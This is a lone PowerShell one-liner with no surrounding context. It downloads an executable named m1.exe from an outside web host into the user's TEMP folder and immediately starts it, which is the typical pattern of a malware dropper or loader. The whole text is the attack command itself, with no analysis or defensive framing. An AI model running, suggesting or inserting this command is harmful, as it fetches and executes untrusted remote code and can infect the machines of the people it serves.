
(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/m/m1.exe',"$env:TEMP\m1.exe");Start-Process ("$env:TEMP\m1.exe")

